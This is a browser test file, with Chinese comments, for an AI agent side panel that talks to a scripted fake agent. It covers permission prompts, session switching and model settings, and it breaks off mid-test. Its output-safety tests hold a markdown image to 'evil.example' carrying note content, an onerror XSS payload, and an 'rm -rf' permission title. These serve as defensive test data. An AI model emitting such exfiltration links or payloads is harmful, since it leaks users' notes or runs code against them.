/**
 * AI 会话面板（§7.8）。对面是一个照着剧本说话的假 agent。
 *
 * 剧本照抄真机（Claude 的 ACP 适配器）：先流式回一段话，再为改文件来要
 * 许可 —— 许可请求的 id 是 0，带着 diff；拿到「允许」之后把工具调用标成
 * 完成，最后才回 `session/prompt`。
 *
 * 要在真浏览器里跑：回答是 `dangerouslySetInnerHTML` 进去的，链接点下去
 * 会不会把整个 webview 带走、外链图片会不会被加载，happy-dom 答不了。
 */
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import "../../../src/ui/styles.css";

type Listener = (e: { id: string; line?: string; code?: number | null }) => void;

const h = vi.hoisted(() => {
  const state = {
    lines: [] as Listener[],
    errs: [] as Listener[],
    exits: [] as Listener[],
    /** 面板发给 agent 的每一条，已解析 */
    sent: [] as Record<string, unknown>[],
    /** 收到某个方法时怎么办 */
    script: {} as Record<string, (msg: Record<string, unknown>) => void>,
    /** `agentStart` 之前抢先发生的事（命令打错时进程几乎是立刻退出） */
    beforeStart: null as null | (() => void),
    /** 常用适配器装过没有（`agentResolve` 的回答） */
    installed: null as string | null,
    /** 「+」选出来的文件 */
    picked: [] as string[],
  };
  return { state };
});
const { state } = h;

const emit = (line: object) => state.lines.forEach((f) => f({ id: "agent-1", line: JSON.stringify(line) }));
const reply = (id: unknown, result: unknown) => emit({ jsonrpc: "2.0", id, result });
const update = (u: object) => emit({ jsonrpc: "2.0", method: "session/update", params: { sessionId: "s1", update: u } });

vi.mock("../../../src/host/api", () => ({
  api: {
    agentStart: vi.fn(async () => {
      h.state.beforeStart?.();
      return ["agent-1", "D:\\Notes\\vault"];
    }),
    agentSend: vi.fn(async (_id: string, line: string) => {
      const msg = JSON.parse(line);
      h.state.sent.push(msg);
      const run = h.state.script[msg.method as string];
      if (run) setTimeout(() => run(msg), 0);
    }),
    agentStop: vi.fn(async () => {}),
    agentResolve: vi.fn(async () => h.state.installed),
    agentInstall: vi.fn(async (pkg: string) => {
      h.state.installed = `node "C:/agents/${pkg}/index.js"`;
      return h.state.installed;
    }),
    agentUpdate: vi.fn(async () => false),
    textDiff: vi.fn(async (path: string, _old: string, next: string) => ({
      path,
      kind: "added",
      additions: 1,
      deletions: 0,
      binary: false,
      hunks: [
        {
          oldStart: 0,
          oldLines: 0,
          newStart: 1,
          newLines: 1,
          lines: [{ kind: "added", oldLine: null, newLine: 1, text: next.trim() }],
        },
      ],
    })),
  },
  onAgentLine: async (f: Listener) => {
    h.state.lines.push(f);
    return () => {};
  },
  onAgentStderr: async (f: Listener) => {
    h.state.errs.push(f);
    return () => {};
  },
  onAgentExit: async (f: Listener) => {
    h.state.exits.push(f);
    return () => {};
  },
  pickFiles: async () => h.state.picked,
}));

const confirmMock = vi.fn(async () => true);
vi.mock("../../../src/host/dialog", () => ({ confirm: (...a: unknown[]) => confirmMock(...(a as [])) }));

const openExternalPage = vi.fn();
vi.mock("../../../src/host/external", () => ({ openExternalPage: (u: string) => openExternalPage(u) }));

const { AgentPanel } = await import("../../../src/ui/AgentPanel");

(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

const settle = (ms = 60) => new Promise((r) => setTimeout(r, ms));
const last = <T,>(xs: T[]): T | undefined => xs[xs.length - 1];

/** 等到条件成立。握手是好几轮异步来回，固定睡多久都可能不够 */
async function until(cond: () => boolean, what: string) {
  for (let i = 0; i < 60 && !cond(); i++) {
    await act(async () => {
      await settle(25);
    });
  }
  expect(cond(), what).toBe(true);
}

const handshake = () => {
  state.script.initialize = (m) => reply(m.id, { protocolVersion: 1, agentInfo: { name: "fake", title: "Fake Agent" } });
  state.script["session/new"] = (m) =>
    reply(m.id, {
      sessionId: "s1",
      modes: {
        currentModeId: "default",
        availableModes: [
          { id: "default", name: "Default" },
          { id: "acceptEdits", name: "Accept Edits" },
        ],
      },
    });
};

let root: Root | null = null;
let host: HTMLElement;
const onOpenPath = vi.fn();
const beforePrompt = vi.fn(async () => {});

const onPickCommand = vi.fn();

async function mount(
  ctx = { path: "项目/甲.md" as string | null, selection: "" },
  command = "fake-agent",
) {
  host = document.createElement("div");
  host.style.cssText = "position:fixed;inset:0;display:grid;grid-template-areas:'agent'";
  document.body.appendChild(host);
  root = createRoot(host);
  await act(async () => {
    root!.render(
      <AgentPanel
        command={command}
        onPickCommand={onPickCommand}
        width={420}
        onWidthChange={() => {}}
        cover={false}
        onClose={() => {}}
        getContext={() => ctx}
        beforePrompt={beforePrompt}
        onOpenPath={onOpenPath}
        onOpenSettings={() => {}}
      />,
    );
    await settle(50);
  });
  // 停在「能用」或者「已经退出」之一，才算起完了
  await until(
    () =>
      !!host.querySelector(".agent-dead") ||
      !!host.querySelector(".agent-choose") ||
      (state.sent.some((m) => m.method === "session/new") &&
        !host.querySelector(".agent-status") &&
        !!host.querySelector(".agent-empty")),
    "面板该停在「能用」或「已经退出」",
  );
}

async function type(text: string) {
  const ta = host.querySelector("textarea")!;
  await act(async () => {
    const set = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!;
    set.call(ta, text);
    ta.dispatchEvent(new Event("input", { bubbles: true }));
    await settle(10);
  });
  await act(async () => {
    ta.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true, cancelable: true }));
    await settle(150);
  });
}

const button = (label: string) =>
  [...host.querySelectorAll<HTMLButtonElement>("button")].find((b) => b.textContent?.trim() === label);

beforeEach(() => {
  localStorage.clear();
  state.lines = [];
  state.errs = [];
  state.exits = [];
  state.sent = [];
  state.script = {};
  state.beforeStart = null;
  state.installed = null;
  state.picked = [];
  openExternalPage.mockClear();
  onOpenPath.mockClear();
  beforePrompt.mockClear();
  handshake();
});

afterEach(() => {
  act(() => root?.unmount());
  root = null;
  document.body.innerHTML = "";
});

describe("起来", () => {
  it("还没选过跑哪个：什么都不起，请人挑一个", async () => {
    const { api } = await import("../../../src/host/api");
    (api.agentStart as ReturnType<typeof vi.fn>).mockClear();
    await mount(undefined, "");
    expect(api.agentStart, "不能替人跑一个他没选过的程序（§7.5）").not.toHaveBeenCalled();
    expect(host.querySelector<HTMLTextAreaElement>("textarea")!.disabled).toBe(true);
    await act(async () => {
      [...host.querySelectorAll<HTMLButtonElement>(".agent-choice")]
        .find((b) => b.textContent?.includes("Codex"))!
        .click();
      await settle(10);
    });
    expect(onPickCommand).toHaveBeenCalledWith("npx -y @agentclientprotocol/codex-acp");
  });


  it("握手、开会话，标题是 agent 的名字，模式可选", async () => {
    await mount();
    expect(state.sent.map((m) => m.method)).toEqual(["initialize", "session/new"]);
    // 工作目录交给 agent 的是 vault 根
    expect(state.sent[1].params).toEqual({ cwd: "D:\\Notes\\vault", mcpServers: [] });
    // 左上角是当前对话的名字；agent 的名字在提示里
    expect(host.querySelector(".agent-title")?.textContent).toContain("新对话");
    expect(host.querySelector(".agent-title")?.getAttribute("title")).toContain("Fake Agent");
    // 只给了旧写法的模式：画在输入框下面那一行，叫「权限」
    const select = host.querySelector<HTMLSelectElement>('.agent-bar select[aria-label="权限"]')!;
    // agent 给的英文名换成说人话的中文
    expect([...select.options].map((o) => o.textContent)).toEqual(["每次询问", "自动接受修改"]);
    expect(host.querySelector<HTMLTextAreaElement>("textarea")!.disabled).toBe(false);
  });

  it("命令打错：进程在拿到 id 之前就退出了，也要停在「已经退出」并摆出原因", async () => {
    state.beforeStart = () => {
      state.errs.forEach((f) => f({ id: "agent-1", line: "'fake-agent' 不是内部或外部命令" }));
      state.exits.forEach((f) => f({ id: "agent-1", code: 1 }));
    };
    await mount();
    const dead = host.querySelector(".agent-dead");
    expect(dead, "不能一直停在「正在启动」").not.toBeNull();
    expect(dead!.textContent).toContain("退出码 1");
    expect(host.querySelector(".agent-stderr")?.textContent).toContain("不是内部或外部命令");
    expect(button("重新启动")).toBeTruthy();
  });

  it("需要登录：说清楚去哪儿登录，而不是只给一个错误码", async () => {
    state.script["session/new"] = (m) =>
      emit({ jsonrpc: "2.0", id: m.id, error: { code: -32000, message: "Authentication required" } });
    await mount();
    expect(host.querySelector(".agent-dead")?.textContent).toContain("需要先登录");
  });
});

describe("一轮对话", () => {
  it("带上当前笔记，回答按 Markdown 和公式排好版", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "**重点** 是 " } });
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "$x^2$" } });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("总结一下");

    expect(beforePrompt, "发问之前先落盘：agent 读的是磁盘上的文件").toHaveBeenCalled();
    const prompt = state.sent.find((m) => m.method === "session/prompt")!.params as {
      prompt: { type: string; uri?: string; text?: string }[];
    };
    expect(prompt.prompt[0]).toEqual({ type: "text", text: "总结一下" });
    expect(prompt.prompt[1]).toMatchObject({
      type: "resource_link",
      uri: "file:///D:/Notes/vault/%E9%A1%B9%E7%9B%AE/%E7%94%B2.md",
    });

    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("总结一下");
    const md = host.querySelector(".agent-md")!;
    expect(md.querySelector("strong")?.textContent).toBe("重点");
    expect(md.querySelector(".katex"), "公式要渲染出来").not.toBeNull();
  });

  it("点掉笔记那一枚，就不带它", async () => {
    state.script["session/prompt"] = (m) => reply(m.id, { stopReason: "end_turn" });
    await mount();
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-chip")!.click();
      await settle(10);
    });
    await type("随便聊聊");
    const prompt = state.sent.find((m) => m.method === "session/prompt")!.params as { prompt: unknown[] };
    expect(prompt.prompt).toHaveLength(1);
  });

  it("要改文件：先摆出 diff 等人点头，点「允许」才回给它", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "tool_call", toolCallId: "t1", title: "Write", kind: "edit", status: "pending" });
      emit({
        jsonrpc: "2.0",
        id: 0,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: {
            toolCallId: "t1",
            title: "Write 项目/乙.md",
            kind: "edit",
            content: [{ type: "diff", path: "D:\\Notes\\vault\\项目\\乙.md", oldText: null, newText: "新的一篇\n" }],
          },
          options: [
            { kind: "allow_always", name: "Always Allow", optionId: "allow_always" },
            { kind: "allow_once", name: "Allow", optionId: "allow" },
            { kind: "reject_once", name: "Reject", optionId: "reject" },
          ],
        },
      });
      state.script.__afterPermission = () => {
        update({
          sessionUpdate: "tool_call_update",
          toolCallId: "t1",
          title: "Write 项目/乙.md",
          status: "completed",
          content: [{ type: "diff", path: "D:\\Notes\\vault\\项目\\乙.md", oldText: null, newText: "新的一篇\n" }],
        });
        reply(m.id, { stopReason: "end_turn" });
      };
    };
    await mount();
    await type("新建一篇乙");

    const card = host.querySelector(".agent-permission");
    expect(card, "许可请求要摆出来").not.toBeNull();
    expect(card!.textContent).toContain("Write 项目/乙.md");
    // 路径换成 vault 里的相对路径，diff 用版本历史那个视图画
    expect(card!.querySelector(".agent-diff-path")?.textContent).toContain("项目/乙.md");
    expect(card!.querySelector(".diff-unified")?.textContent).toContain("新的一篇");
    expect([...card!.querySelectorAll("button")].map((b) => b.textContent)).toEqual(["总是允许", "允许", "拒绝"]);
    expect(state.sent.some((m) => m.id === 0), "人还没点，不能替他回").toBe(false);

    await act(async () => {
      button("允许")!.click();
      await settle(30);
    });
    expect(state.sent.find((m) => m.id === 0)).toEqual({
      jsonrpc: "2.0",
      id: 0,
      result: { outcome: { outcome: "selected", optionId: "allow" } },
    });
    await act(async () => {
      // 许可的回答没有 method，剧本接不住它 —— 这里手动接着往下演
      state.script.__afterPermission?.({});
      await settle(60);
    });
    expect(host.querySelector(".agent-permission")).toBeNull();
    expect(host.querySelector(".agent-tool.is-completed")).not.toBeNull();

    // 改到的那篇可以直接点开
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-tool-files .agent-link")!.click();
      await settle(10);
    });
    expect(onOpenPath).toHaveBeenCalledWith("项目/乙.md");
  });

  it("停下：发 session/cancel，还没回的许可按「取消」回掉", async () => {
    state.script["session/prompt"] = () => {
      emit({
        jsonrpc: "2.0",
        id: 0,
        method: "session/request_permission",
        params: {
          sessionId: "s1",
          toolCall: { toolCallId: "t1", title: "rm -rf 笔记", kind: "execute" },
          options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
        },
      });
    };
    await mount();
    await type("清理一下");
    expect(host.querySelector(".agent-permission")).not.toBeNull();
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-send.is-stop")!.click();
      await settle(30);
    });
    expect(state.sent.find((m) => m.id === 0)).toMatchObject({ result: { outcome: { outcome: "cancelled" } } });
    expect(state.sent.some((m) => m.method === "session/cancel")).toBe(true);
  });
});

describe("回答里的东西不能越界", () => {
  it("链接交给系统浏览器，webview 不原地跳走", async () => {
    state.script["session/prompt"] = (m) => {
      update({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "见 [文档](https://example.com/doc)" } });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("给个链接");
    const a = host.querySelector<HTMLAnchorElement>(".agent-md a")!;
    const before = location.href;
    await act(async () => {
      a.click();
      await settle(10);
    });
    expect(location.href).toBe(before);
    expect(openExternalPage).toHaveBeenCalledWith("https://example.com/doc");
  });

  it("外链图片不加载 —— 那是把笔记内容送出去的一条路", async () => {
    state.script["session/prompt"] = (m) => {
      update({
        sessionUpdate: "agent_message_chunk",
        content: { type: "text", text: "![](https://evil.example/x.png?q=笔记内容)" },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("画张图");
    expect(host.querySelector(".agent-md img")).toBeNull();
  });

  it("原样的 HTML 不执行", async () => {
    state.script["session/prompt"] = (m) => {
      update({
        sessionUpdate: "agent_message_chunk",
        content: { type: "text", text: '<img src=x onerror="window.__pwned=1">' },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("x");
    await act(async () => {
      await settle(100);
    });
    expect((window as { __pwned?: number }).__pwned).toBeUndefined();
    expect(host.querySelector(".agent-md img")).toBeNull();
  });
});

describe("切换对话", () => {
  /** 每次 session/new 给一个新 id，回答里带上是哪个对话 */
  const twoSessions = () => {
    let n = 0;
    state.script["session/new"] = (m) => reply(m.id, { sessionId: `s${++n}` });
    state.script["session/prompt"] = (m) => {
      const sid = (m.params as { sessionId: string }).sessionId;
      emit({
        jsonrpc: "2.0",
        method: "session/update",
        params: { sessionId: sid, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: `这里是 ${sid}` } } },
      });
      reply(m.id, { stopReason: "end_turn" });
    };
  };

  const openMenu = async () => {
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-title")!.click();
      await settle(60);
    });
  };
  const menuItems = () => [
    ...host.querySelectorAll<HTMLButtonElement>(".agent-menu-item:not(.is-new):not(.agent-menu-agent)"),
  ];

  it("开着的几个对话可以来回切，各说各的", async () => {
    twoSessions();
    await mount();
    await type("第一个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s1");

    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(60);
    });
    expect(host.querySelector(".agent-msg"), "新对话是空白的").toBeNull();
    await type("第二个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s2");
    expect(host.querySelector(".agent-title")?.textContent).toContain("第二个问题");

    await openMenu();
    expect(menuItems().map((b) => b.querySelector(".agent-menu-title")?.textContent)).toEqual([
      "第二个问题",
      "第一个问题",
    ]);
    await act(async () => {
      menuItems()[1].click();
      await settle(60);
    });
    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("第一个问题");
    expect(host.querySelector(".agent-md")?.textContent).toBe("这里是 s1");
    expect(host.querySelector(".agent-menu"), "选完就收起").toBeNull();
  });

  it("空白的新对话不重复开：再点「新对话」不会多出一个", async () => {
    twoSessions();
    await mount();
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(60);
    });
    expect(state.sent.filter((m) => m.method === "session/new")).toHaveLength(1);
  });

  it("后台那个对话来要许可：列表里标出来，切过去才看得到那张卡", async () => {
    let n = 0;
    state.script["session/new"] = (m) => reply(m.id, { sessionId: `s${++n}` });
    state.script["session/prompt"] = (m) => {
      const sid = (m.params as { sessionId: string }).sessionId;
      if (sid === "s1") {
        // 第一个对话：过一会儿才来要许可，那时人已经切到第二个了
        setTimeout(
          () =>
            emit({
              jsonrpc: "2.0",
              id: 0,
              method: "session/request_permission",
              params: {
                sessionId: "s1",
                toolCall: { toolCallId: "t1", title: "Write 甲.md", kind: "edit" },
                options: [{ kind: "allow_once", name: "Allow", optionId: "allow" }],
              },
            }),
          120,
        );
      } else reply(m.id, { stopReason: "end_turn" });
    };
    await mount();
    await type("改一下甲");
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(300);
    });
    expect(host.querySelector(".agent-permission"), "不是这个对话的许可，不能摆在这里").toBeNull();

    await openMenu();
    const first = menuItems().find((b) => b.textContent?.includes("改一下甲"))!;
    expect(first.querySelector(".agent-menu-meta")?.textContent).toBe("等你确认");
    await act(async () => {
      first.click();
      await settle(60);
    });
    expect(host.querySelector(".agent-permission")?.textContent).toContain("Write 甲.md");
  });

  it("以前的对话：agent 列得出来就能接着聊，历史由它重放过来", async () => {
    state.script.initialize = (m) =>
      reply(m.id, {
        protocolVersion: 1,
        agentInfo: { name: "fake" },
        agentCapabilities: { loadSession: true, sessionCapabilities: { list: {} } },
      });
    state.script["session/list"] = (m) =>
      reply(m.id, {
        sessions: [{ sessionId: "old1", cwd: String.raw`D:\Notes\vault`, title: "整理论文清单", updatedAt: "2026-10-01T08:00:00Z" }],
      });
    state.script["session/load"] = (m) => {
      const say = (update: object) =>
        emit({ jsonrpc: "2.0", method: "session/update", params: { sessionId: "old1", update } });
      say({ sessionUpdate: "user_message_chunk", content: { type: "text", text: "把清单整理一下" } });
      say({ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "整理好了" } });
      reply(m.id, {});
    };
    await mount();
    await openMenu();
    expect(state.sent.find((m) => m.method === "session/list")?.params).toEqual({ cwd: String.raw`D:\Notes\vault` });
    const old = menuItems().find((b) => b.textContent?.includes("整理论文清单"));
    expect(old, "以前的对话要列出来").toBeTruthy();
    await act(async () => {
      old!.click();
      await settle(100);
    });
    expect(state.sent.find((m) => m.method === "session/load")?.params).toMatchObject({ sessionId: "old1" });
    expect(host.querySelector(".agent-msg.is-user")?.textContent).toContain("把清单整理一下");
    expect(host.querySelector(".agent-md")?.textContent).toBe("整理好了");
    expect(host.querySelector(".agent-title")?.textContent).toContain("整理论文清单");
  });

  it("agent 不提供以前的对话：只列这次的，并说一声", async () => {
    await mount();
    await openMenu();
    expect(state.sent.some((m) => m.method === "session/list")).toBe(false);
    expect(host.querySelector(".agent-menu-note")?.textContent).toContain("不提供以前的对话");
  });
});

describe("换一个 AI", () => {
  const openMenu = async () => {
    await act(async () => {
      host.querySelector<HTMLButtonElement>(".agent-title")!.click();
      await settle(60);
    });
  };
  const agentItem = (label: string) =>
    [...host.querySelectorAll<HTMLButtonElement>(".agent-menu-agent")].find((b) =>
      b.querySelector(".agent-menu-title")?.textContent?.includes(label),
    );

  beforeEach(() => {
    confirmMock.mockClear();
    confirmMock.mockImplementation(async () => true);
    onPickCommand.mockClear();
  });

  it("对话列表里就能换，正在用的那个标出来", async () => {
    await mount(undefined, "npx -y @agentclientprotocol/claude-agent-acp");
    await openMenu();
    expect(agentItem("Claude Code")?.getAttribute("aria-checked")).toBe("true");
    expect(agentItem("Claude Code")?.textContent).toContain("正在用");
    await act(async () => {
      agentItem("Codex")!.click();
      await settle(30);
    });
    expect(confirmMock, "没有在跑的对话，不用问").not.toHaveBeenCalled();
    expect(onPickCommand).toHaveBeenCalledWith("npx -y @agentclientprotocol/codex-acp");
  });

  it("设置里填的是别的命令：也列出来，标成正在用", async () => {
    await mount();
    await openMenu();
    const custom = [...host.querySelectorAll(".agent-menu-agent.is-current")];
    expect(custom).toHaveLength(1);
    expect(custom[0].textContent).toContain("Fake Agent");
  });

  it("有对话正在回答：先问一句，说不换就不换", async () => {
    state.script["session/prompt"] = () => {}; // 一直不回，停在「正在回答」
    confirmMock.mockImplementation(async () => false);
    await mount();
    await type("慢慢想");
    await openMenu();
    await act(async () => {
      agentItem("Codex")!.click();
      await settle(30);
    });
    expect(confirmMock).toHaveBeenCalled();
    expect(onPickCommand).not.toHaveBeenCalled();
  });

  it("AI 起不来时也能换 —— 那正是最想换的时候", async () => {
    state.beforeStart = () => state.exits.forEach((f) => f({ id: "agent-1", code: 1 }));
    await mount();
    expect(host.querySelector(".agent-dead")).not.toBeNull();
    await openMenu();
    expect(host.querySelector<HTMLButtonElement>(".agent-menu-item.is-new")!.disabled).toBe(true);
    await act(async () => {
      agentItem("Gemini")!.click();
      await settle(30);
    });
    expect(onPickCommand).toHaveBeenCalledWith("gemini --acp");
  });
});

describe("选模型", () => {
  /** 照抄 Claude 适配器 session/new 回的 configOptions（截短了） */
  const claudeConfig = (model = "opus", mode = "default") => [
    {
      id: "mode",
      name: "Mode",
      category: "mode",
      type: "select",
      currentValue: mode,
      options: [
        { value: "default", name: "Default" },
        { value: "acceptEdits", name: "Accept Edits" },
        { value: "bypassPermissions", name: "Bypass Permissions" },
      ],
    },
    {
      id: "model",
      name: "Model",
      category: "model",
      type: "select",
      currentValue: model,
      options: [
        { value: "opus", name: "Opus 5.5" },
        { value: "sonnet", name: "Sonnet 5.5" },
        { value: "haiku", name: "Haiku 5.5" },
      ],
    },
  ];

  beforeEach(() => {
    let n = 0;
    state.script["session/new"] = (m) =>
      reply(m.id, {
        sessionId: `s${++n}`,
        // 旧写法也给着 —— 有 configOptions 时不能再画一份
        modes: { currentModeId: "default", availableModes: [{ id: "default", name: "Default" }] },
        configOptions: claudeConfig(),
      });
    state.script["session/set_config_option"] = (m) => {
      const p = m.params as { configId: string; value: string };
      const cfg = claudeConfig(
        p.configId === "model" ? p.value : "opus",
        p.configId === "mode" ? p.value : "default",
      );
      reply(m.id, { configOptions: cfg });
    };
  });

  const select = (label: string) =>
    host.querySelector<HTMLSelectElement>(`.agent-bar select[aria-label="${label}"]`);
  const choose = async (label: string, value: string) => {
    await act(async () => {
      const el = select(label)!;
      el.value = value;
      el.dispatchEvent(new Event("change", { bubbles: true }));
      await settle(60);
    });
  };
  const sets = () =>
    state.sent.filter((m) => m.method === "session/set_config_option").map((m) => m.params);

  it("agent 报上来的模型列在输入框下面，选了就告诉它", async () => {
    await mount();
    expect([...select("模型")!.options].map((o) => o.textContent)).toEqual(["Opus 5.5", "Sonnet 5.5", "Haiku 5.5"]);
    expect(select("模型")!.value).toBe("opus");
    expect(host.querySelectorAll('.agent-bar select[aria-label="权限"]'), "权限只画一份").toHaveLength(1);

    await choose("模型", "sonnet");
    expect(sets()).toEqual([{ sessionId: "s1", configId: "model", value: "sonnet" }]);
    expect(select("模型")!.value).toBe("sonnet");
  });

  it("新对话沿用上次选的模型", async () => {
    await mount();
    await choose("模型", "haiku");
    state.sent = [];
    await type("说句话"); // 让当前对话不是空白的，「新对话」才会真的开一个
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(120);
    });
    expect(sets()).toContainEqual({ sessionId: "s2", configId: "model", value: "haiku" });
    expect(select("模型")!.value).toBe("haiku");
  });

  it("权限模式不沿用 —— 「跳过所有确认」不能悄悄带进下一个对话", async () => {
    await mount();
    await choose("权限", "bypassPermissions");
    state.sent = [];
    await type("说句话");
    await act(async () => {
      host.querySelector<HTMLButtonElement>('[aria-label="新对话"]')!.click();
      await settle(120);
    });
    expect(sets().some((p) => (p as { configId: string }).configId === "mode")).toBe(false);
    expect(select("权限")!.value).toBe("default");
  });

  it("记住的是按 AI 分开的：别的命令下次启动不受影响", async () => {
    await mount(undefined, "claude-cmd");
    await choose("模型", "sonnet");
    act(() => root?.unmount());
    root = null;
    document.body.innerHTML = "";
    state.sent = [];
    await mount(undefined, "codex-cmd");
    expect(sets()).toEqual([]);
  });
});

describe("思考强度和上下文", () => {
  const sel = (label: string) => host.querySelector<HTMLSelectElement>(`.agent-bar select[aria-label="${label}"]`);
  const choose = async (label: string, value: string) => {
    await act(async () => {
      const el = sel(label)!;
      el.value = value;
      el.dispatchEvent(new Event("change", { bubbles: true }));
      await settle(120);
    });
  };
  const sent = (method: string) => state.sent.filter((m) => m.method === method).map((m) => m.params);

  it("Codex：强度编在模型名里，拆成两个下拉，改哪个都拼回去", async () => {
    // 照抄 codex-acp：configOptions 只列基础模型，强度只在旧写法的变体列表里
    const variants = ["gpt-6.1-sol", "gpt-5.5/low", "gpt-5.5/medium", "gpt-5.5/high", "gpt-5.4/low", "gpt-5.4/high"];
    const cfg = (model: string) => [
      {
        id: "mode",
        name: "Mode",
        category: "mode",
        type: "select",
        currentValue: "read-only",
        options: [
          { value: "read-only", name: "Read Only" },
          { value: "full-access", name: "Full Access" },
        ],
      },
      {
        id: "model",
        name: "Model",
        category: "model",
        type: "select",
        currentValue: model,
        options: [
          { value: "gpt-6.1-sol", name: "gpt-6.1-sol" },
          { value: "gpt-5.5", name: "GPT-5.5" },
          { value: "gpt-5.4", name: "gpt-5.4" },
        ],
      },
    ];
    state.script["session/new"] = (m) =>
      reply(m.id, {
        sessionId: "s1",
        configOptions: cfg("gpt-5.5"),
        models: { currentModelId: "gpt-5.5", availableModels: variants.map((modelId) => ({ modelId, name: modelId })) },
      });
    state.script["session/set_config_option"] = (m) =>
      reply(m.id, { configOptions: cfg((m.params as { value: string }).value) });
    await mount();

    expect([...sel("思考强度")!.options].map((o) => o.textContent)).toEqual(["默认强度", "低", "中", "高"]);
    await choose("思考强度", "high");
    expect(sent("session/set_config_option")).toEqual([{ sessionId: "s1", configId: "model", value: "gpt-5.5/high" }]);
    // 回来的当前值是 `gpt-5.5/high`：模型那一格仍显示基础名
    expect(sel("模型")!.value).toBe("gpt-5.5");
    expect(sel("思考强度")!.value).toBe("high");

    await choose("模型", "gpt-5.4");
    expect(last(sent("session/set_config_option"))).toEqual({ sessionId: "s1", configId: "model", value: "gpt-5.4/high" });

    // 没有强度可选的模型：那一格留着但灰掉，不让人以为面板漏了这个功能
    await choose("模型", "gpt-6.1-sol");
    expect(sel("思考强度")!.disabled).toBe(true);
  });

  it("新版 Codex：换到支持的模型后才报出「思考强度」这一项，照着画", async () => {
    // 照抄 codex-acp 0.16：gpt-6.1-sol 没有这一项；换成 gpt-5.5 之后回来的配置里多了
    // 一项 category 为 thought_level 的 reasoning_effort
    const mode = {
      id: "mode",
      name: "Mode",
      category: "mode",
      type: "select",
      currentValue: "auto",
      options: [{ value: "auto", name: "Default" }],
    };
    const model = (v: string) => ({
      id: "model",
      name: "Model",
      category: "model",
      type: "select",
      currentValue: v,
      options: [
        { value: "gpt-6.1-sol", name: "gpt-6.1-sol" },
        { value: "gpt-5.5", name: "GPT-5.5" },
      ],
    });
    const reasoning = (v: string) => ({
      id: "reasoning_effort",
      name: "Reasoning Effort",
      category: "thought_level",
      type: "select",
      currentValue: v,
      options: ["low", "medium", "high", "xhigh"].map((x) => ({ value: x, name: x })),
    });
    state.script["session/new"] = (m) => reply(m.id, { sessionId: "s1", configOptions: [mode, model("gpt-6.1-sol")] });
    state.script["session/set_config_option"] = (m) => {
      const p = m.params as { configId: string; value: string };
      const effortNow = p.configId === "reasoning_effort" ? p.value : "xhigh";
      reply(m.id, { configOptions: [mode, model("gpt-5.5"), reasoning(effortNow)] });
    };
    await mount();
    expect(sel("思考强度")!.disabled, "gpt-6.1-sol 没有档位可选").toBe(true);

    await choose("模型", "gpt-5.5");
    expect(sel("思考强度")!.disabled).toBe(false);
    expect([...sel("思考强度")!.options].map((o) => o.textContent)).toEqual(["低", "中", "高", "超高"]);
    await choose("思考强度", "high");
    expect(last(sent("session/set_config_option"))).toEqual({ sessionId: "s1", configId: "reasoning_effort", value: "high" });
    expect(sel("思考强度")!.value).toBe("high");
  });

  /** 照抄 claude-agent-acp 的 initialize：私有声明里有 claudeCode，能关、能接回 */
  const claudeLike = () => {
    state.script.initialize = (m) =>
      reply(m.id, {
        protocolVersion: 1,
        agentInfo: { name: "claude", title: "Claude Agent" },
        agentCapabilities: {
          loadSession: true,
          sessionCapabilities: { close: {} },
          _meta: { claudeCode: { promptQueueing: true } },
        },
      });
    let n = 0;
    state.script["session/new"] = (m) => reply(m.id, { sessionId: `s${++n}` });
    state.script["session/close"] = (m) => reply(m.id, {});
    state.script["session/prompt"] = (m) => reply(m.id, { stopReason: "end_turn" });
    state.script["session/load"] = (m) => {
      const sid = (m.params as { sessionId: string }).sessionId;
      emit({
        jsonrpc: "2.0",
        method: "session/update",
        params: { sessionId: sid, update: { sessionUpdate: "user_message_chunk", content: { type: "text", text: "之前问的" } } },
      });
      reply(m.id, {});
    };
  };
  const effortOf = (p: unknown) =>
    ((p as { _meta?: { claudeCode?: { options?: { effort?: string } } } })._meta?.claudeCode?.options?.effort) ?? null;

  it("Claude：空白对话里换强度，直接换一个带着新强度开的对话", async () => {
    claudeLike();
    await mount();
    expect([...sel("思考强度")!.options].map((o) => o.textContent)).toEqual(["默认强度", "低", "中", "高", "超高", "极高"]);
    await choose("思考强度", "high");
    const news = sent("session/new");
    expect(news).toHaveLength(2);
    expect(effortOf(news[1])).toBe("high");
    expect(sent("session/close")).toEqual([{ sessionId: "s1" }]);
    expect(sel("思考强度")!.value).toBe("high");
  });

  it("Claude：说过话的对话里换强度，关掉再带着新强度接回来，历史由它重放", async () => {
    claudeLike();
    await mount();
    await type("先问一句");
    await choose("思考强度", "medium");
